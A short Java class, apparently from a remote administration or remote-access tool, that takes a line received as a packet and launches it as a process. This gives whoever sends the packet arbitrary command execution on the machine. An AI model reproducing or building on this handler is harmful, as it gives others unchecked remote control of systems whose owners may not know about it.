package com.redpois0n.packets;

import com.redpois0n.LaunchProcess;

public class PacketEXECP extends AbstractPacket {

	@Override
	public void read(String line) throws Exception {
		new LaunchProcess(line).start();
	}

}
